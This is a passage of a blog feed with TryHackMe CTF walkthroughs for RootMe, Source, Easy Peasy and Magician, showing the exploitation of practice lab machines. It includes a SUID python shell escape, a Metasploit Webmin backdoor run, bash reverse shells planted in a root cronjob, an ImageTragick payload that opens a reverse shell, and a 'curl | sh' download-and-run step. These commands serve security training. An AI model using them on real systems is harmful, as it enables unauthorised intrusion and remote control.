<h3 id="42-find-a-form-to-escalate-your-privileges">4.2 Find a form to escalate your privileges.</h3>

<p><em><strong>Hint : Search for gtfobins</strong></em></p>

<p>Let’s go to <a href="https://gtfobins.github.io/gtfobins/python/">gtfobins</a> and search for python.</p>

<p><img src="/assets/img/tryhackme/rootme/gtfobins.png" alt="gtfobins" /></p>

<p>Let’s run the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/rootme/privesc.png" alt="privesc" /></p>

<p>Yesss, We get root privilege. Now let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/rootme/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, linux, security" /><summary type="html"><![CDATA[A ctf for beginners, can you root me?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/rootme.png" /><media:content medium="image" url="http://localhost:4000/assets/img/rootme.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Source</title><link href="http://localhost:4000/tryhackme-source/" rel="alternate" type="text/html" title="TryHackMe - Source" /><published>2023-03-25T00:00:00+03:00</published><updated>2023-03-25T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-source</id><content type="html" xml:base="http://localhost:4000/tryhackme-source/"><![CDATA[<p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>

<p><br /></p>

<h2 id="1-embark">1. Embark</h2>

<p>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?</p>

<p><br /></p>

<h3 id="11-usertxt">1.1 user.txt</h3>

<p>Let’s do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.11.143
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/source/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 1000/tcp HTTP</code></strong>.</p>

<p>I am visiting the Webmin page running on port 1000. I see a page like this:</p>

<p><img src="/assets/img/tryhackme/source/home.png" alt="home" /></p>

<p>I fix the URL as HTTP like this <a href="https://10.10.11.143:10000/">https://10.10.11.143:10000/</a></p>

<p>The Webmin login page appears on the page.</p>

<p><img src="/assets/img/tryhackme/source/login.png" alt="login" /></p>

<p>I tried several login attempts but it didn’t work. I’m searching for any security vulnerabilities in the version of Webmin used.</p>

<p><img src="/assets/img/tryhackme/source/browse.png" alt="browse" /></p>

<p>I see that this version of Webmin is vulnerable.</p>

<p>I decide to do a search using Metasploit.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
$ search webmin
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/source/search.png" alt="search" /></p>

<p>I’ve tried most of the ones here. I can only run <strong><code class="language-plaintext highlighter-rouge">7 exploit/linux/http/webmin_backdoor</code></strong>.</p>

<p>Let’s do the settings first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ set RHOSTS 10.10.11.143
$ set LHOST 10.8.86.168
$ set SSL true
$ show options
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/source/set.png" alt="set" /></p>

<p>After making the settings, it should look like this.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ show options
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/source/options.png" alt="options" /></p>

<p>Let’s run it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ run
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/source/run.png" alt="run" /></p>

<p>Yes, it worked. We are inside with root privilege.</p>

<p>Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/source/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="12-roottxt">1.2 root.txt</h3>

<p>Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/source/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="easy, ctf, cve" /><summary type="html"><![CDATA[Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/source.png" /><media:content medium="image" url="http://localhost:4000/assets/img/source.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Easy Peasy</title><link href="http://localhost:4000/tryhackme-easy-peasy/" rel="alternate" type="text/html" title="TryHackMe - Easy Peasy" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-easy-peasy</id><content type="html" xml:base="http://localhost:4000/tryhackme-easy-peasy/"><![CDATA[<p>Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.</p>

<p>Let’s start.</p>

<p><br /></p>

<h2 id="1-enumeration-through-nmap">1. Enumeration through Nmap</h2>

<p>Deploy the machine attached to this task and use nmap to enumerate it.</p>

<p><br /></p>

<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>

<p>Let’s do a nmap scan first.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.46.132 -p-
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP</code></strong>.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: 3</code></strong></p>

<p><br /></p>
<h3 id="12-what-is-the-version-of-nginx">1.2 What is the version of nginx?</h3>

<p>Look carefully at port 80.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/nginx.png" alt="nginx" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: 1.16.1</code></strong></p>

<p><br /></p>

<h3 id="13-what-is-running-on-the-highest-port">1.3 What is running on the highest port?</h3>

<p>The highest port is 65524.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/apache.png" alt="apache" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: apache</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h3 id="2-compromising-the-machine">2 Compromising the machine</h3>

<p>Now you’ve enumerated the machine, answer questions and compromise it!</p>

<p><br /></p>

<h3 id="21-using-gobuster-find-flag-1">2.1 Using GoBuster, find flag 1.</h3>

<p>I’m visiting the site running on port 80 and I see such a page.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/first-home.png" alt="first-home" /></p>

<p>I checked the source page but couldn’t find anything remarkable.</p>

<p>Let’s do a gobuster scan and see if we can find anything.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/gobuster-one.png" alt="gobuster-one" /></p>

<p>We found /hidden the directory. I’ve been looking through the page but couldn’t find any flags. I’m scanning this directory with gobuster.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/whatever.png" alt="whatever" /></p>

<p>Nothing appears on the page. Let’s look at the source page.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/decode.png" alt="decode" /></p>

<p>I see an encrypted text. It looks like base64 code. Let’s crack it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/encode.png" alt="encode" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*********}</code></strong></p>

<p><br /></p>

<h3 id="22-further-enumerate-the-machine-what-is-flag-2">2.2 Further enumerate the machine, what is flag 2?</h3>

<p>For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/robots.png" alt="robots" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">a18672860d0510e5ab6699730763b250</code></strong></p>

<p>Let’s look at the type of hash with hash-identifer.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/id-robots.png" alt="id-robots" /></p>

<p>We found the type MD5. Let’s crack it.</p>

<p>I found a site that can crack it online. <a href="https://md5hashing.net/hash">Here</a></p>

<p><img src="/assets/img/tryhackme/easy-peasy/cracking-robots.png" alt="cracking-robots" /></p>

<p><img src="/assets/img/tryhackme/easy-peasy/crack-robots.png" alt="crack-robots" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{********}</code></strong></p>

<p><br /></p>

<h3 id="23-crack-the-hash-with-easypeasytxt-what-is-the-flag-3">2.3 Crack the hash with easypeasy.txt, What is the flag 3?</h3>

<p>When we take a look at Apache, something remarkable emerges.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/flag3.png" alt="flag3" /></p>

<p>let’s crack it :9fdafbd64c47471a8f54cd3fc64cd312</p>

<p><img src="/assets/img/tryhackme/easy-peasy/crack-flag3.png" alt="crack-flag3" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: flag{*************************}</code></strong></p>

<p><br /></p>

<h3 id="24-what-is-the-hidden-directory">2.4 What is the hidden directory?</h3>

<p>When we go to the source page of the Apache page, we see something like this.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/apache-source.png" alt="apache-source" /></p>

<p><code class="language-plaintext highlighter-rouge">&lt;p hidden&gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&lt;/p&gt;</code></p>

<p>Encrypted using bas62. Let’s decrypt using <a href="https://gchq.github.io/CyberChef/">Cyber Chef</a>.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/crack-one.png" alt="crack-one" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: /n0th1ng3ls3m4tt3r</code></strong></p>

<p><br /></p>

<h3 id="25-using-the-wordlist-that-provided-to-you-in-this-task-crack-the-hash">2.5 Using the wordlist that provided to you in this task crack the hash</h3>
<p>what is the password?</p>

<p><em>Hint: GOST Hash john –wordlist=easypeasy.txt –format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)</em></p>

<p>Let’s go to <a href="http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/">http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/</a> . Here is the page that comes up.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/find-dict.png" alt="find-dict" /></p>

<p>Let’s check the source of the page.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>

<p>We found this hash.. <code class="language-plaintext highlighter-rouge">940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</code></p>

<p>First I look at the type with hash-identifier.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-id.png" alt="dict-source-id" /></p>

<p>It looks like it was encrypted with Sha-256 but when I tried to crack it it didn’t. Let’s crack it starting from the clue.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=easypeasy.txt --format=gost hash.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/dict-source-crack.png" alt="dict-source-crack" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: **********</code></strong></p>

<p><br /></p>

<h3 id="26-what-is-the-password-to-login-to-the-machine-via-ssh">2.6 What is the password to login to the machine via SSH?</h3>

<p><img src="/assets/img/tryhackme/easy-peasy/dict-source.png" alt="dict-source" /></p>

<p>Let’s download the picture on the page and see. <strong><code class="language-plaintext highlighter-rouge">binarycodepixabay.jpg</code></strong></p>

<p><img src="/assets/img/tryhackme/easy-peasy/pixabay.png" alt="pixabay" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
$ steghide extract -sf binarycodepixabay.jpg
$ cat secrettext.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/secrettext.png" alt="secrettext" /></p>

<p>We found the username and password.</p>

<p><strong><code class="language-plaintext highlighter-rouge">Username: boring</code></strong></p>

<p>Let’s crack the encrypted password first.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/crack-pixabay.png" alt="crack-pixabay" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer: iconvertedmypasswordtobinary</code></strong></p>

<p><br /></p>

<h3 id="27-what-is-the-user-flag">2.7 What is the user flag?</h3>

<p>Let’s do ssh login. Remember ssh is running on port 6498.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i boring@10.10.120.186 -p- 6498
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/sshin.png" alt="sshin" /></p>

<p>And we are inside. Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/user-flag.png" alt="user-flag" /></p>

<p>We found this <strong><code class="language-plaintext highlighter-rouge">synt{***********}</code></strong>. Let’s crack it.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/rot.png" alt="rot" /></p>

<p><br /></p>

<h3 id="28-what-is-the-root-flag">2.8 What is the root flag?</h3>

<p>We need root privilege . I try <code class="language-plaintext highlighter-rouge">sudo l</code> first but it doesn’t work. Then I check the cron job.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/cron.png" alt="cron" /></p>

<p>We found something useful here. Let’s go to the file and do a reverse-shell.</p>

<p>First, let’s set up a netcat listener on our own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Let’s change the file on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/easy-peasy/secretjob.png" alt="secretjob" /></p>

<p>After waiting for a while, we get root privileges.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/root-in.png" alt="root-in" /></p>

<p>Yes, we have root privileges. Let’s get the root flag.</p>

<p><img src="/assets/img/tryhackme/easy-peasy/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Magician</title><link href="http://localhost:4000/tryhackme-magician/" rel="alternate" type="text/html" title="TryHackMe - Magician" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-magician</id><content type="html" xml:base="http://localhost:4000/tryhackme-magician/"><![CDATA[<p>This magical website lets you convert image file formats. Let’s start.</p>

<p><br /></p>

<h2 id="1-find-the-flags">1. Find the flags!</h2>

<p>Note: this machine needs about 7 minutes to start up, please be patient :)</p>

<p>Please add the IP address of this machine with the hostname “magician” to your /etc/hosts file on Linux before you start.
On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.</p>

<p>Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)</p>

<p>Have fun and use your magic skills!</p>

<p><br /></p>

<h3 id="11-usertxt">1.1 user.txt</h3>

<p>Let’s first add the hostname to our /etc/hosts file, as told above.</p>

<p><img src="/assets/img/tryhackme/magician/hosts.png" alt="hosts" /></p>

<p>Let’s do a nmap scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV magician
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/magician/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">21/tcp HTTP, 8080/tcp SSH, and 8081/tcp HTTP</code></strong>.</p>

<p>First, I tried to see if I could login to the FTP server anonymously.</p>

<p><img src="/assets/img/tryhackme/magician/ftp.png" alt="ftp" /></p>

<p>I found an important clue here. 
This is what I came across when I visited this site: <a href="https://imagetragick.com">https://imagetragick.com</a>.</p>

<p><img src="/assets/img/tryhackme/magician/hint.png" alt="hint" /></p>

<p>We will exploit a vulnerability using <strong><code class="language-plaintext highlighter-rouge">CVE-2016–3714</code></strong>.</p>

<p>Now let’s check the websites running on other ports.</p>

<p>First I examine the site running on port 8080.</p>

<p><img src="/assets/img/tryhackme/magician/8080.png" alt="8080" /></p>

<p>I couldn’t find anything remarkable.</p>

<p>Now let’s examine the site running on port 8081.</p>

<p><img src="/assets/img/tryhackme/magician/home.png" alt="home" /></p>

<p>As far as I can see, I can only upload images. Let’s create a reverse shell by taking advantage of the CVE-2016–3714 vulnerability we found.</p>

<p><img src="/assets/img/tryhackme/magician/image.png" alt="image" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &gt; image.png &lt;&lt; EOF
  push graphic-context
  encoding "UTF-8"
  viewbox 0 0 1 1
  affine 1 0 0 1 0 0 
  push graphic-context
  image Over 0,0 1,1 '|/bin/bash -i &gt; /dev/tcp/10.8.86.168/4444 0&lt;&amp;1 2&gt;&amp;1'
  pop graphic-context
  pop graphic-context
  EOF
</code></pre></div></div>

<p>Now let’s set up a netcat listener on our machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Now we can upload it to the site.</p>

<p><img src="/assets/img/tryhackme/magician/in.png" alt="in" /></p>

<p>And we are inside.</p>

<p>Let’s get the user flag.</p>

<p><img src="/assets/img/tryhackme/magician/user-flag.png" alt="user-flag" /></p>

<h3 id="12-roottxt">1.2 root.txt</h3>

<p>Now we need root privilege. So let’s download linepeas.sh and run it.</p>

<p>I’m downloading <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> on my own machine.</p>

<p>Let’s run the following code in the directory where linpeas.sh is located.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -m http.server 80
</code></pre></div></div>

<p>Then let’s run the following code on the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh
</code></pre></div></div>

<p>And it worked. Let’s see what we can find.</p>

<p>I found this.</p>

<p><img src="/assets/img/tryhackme/magician/linpeas.png" alt="linpeas" /></p>

<p>There is something running on port 6666. To achieve this, we need to do port forwarding.</p>

<p>First, let’s download the <a href="https://github.com/jpillora/chisel/releases">chisel</a> to our own machine and send it to the target machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_arm64.gz
$ gunzip chisel_1.8.1_linux_arm64.gz  
$ mv chisel_1.8.1_linux_arm64 chisel
$ python -m http.server 80
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/magician/chisel.png" alt="chisel" /></p>

<p>On the target machine, we run the following codes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.8.86.168/chisel
$ chmod +x chisel
$ ./chisel client 10.8.86.168:5555 R:5554:127.0.0.1:6666
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/magician/chisel-target.png" alt="chisel-target" /></p>

<p>Then ı return to my own machine and run the following codes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo apt-get install chisel
$ chisel server --reverse --port 5555
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/magician/chisel-own.png" alt="chisel-own" /></p>

<p>Now we can look at the site running on the port we forwarded. <a href="http://0.0.0.0:5554">http://0.0.0.0:5554</a></p>

<p><img src="/assets/img/tryhackme/magician/run.png" alt="run" /></p>

<p>We are looking for /root/root.txt. Press the Submit button until the base64 code is displayed.</p>

<p><img src="/assets/img/tryhackme/magician/encode.png" alt="encode" /></p>

<p>Let’s crack it.</p>

<p><img src="/assets/img/tryhackme/magician/decode.png" alt="decode" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="CVE-2016-3714" /><summary type="html"><![CDATA[This magical website lets you convert image file formats. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/magician.png" /><media:content medium="image" url="http://localhost:4000/assets/img/magician.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>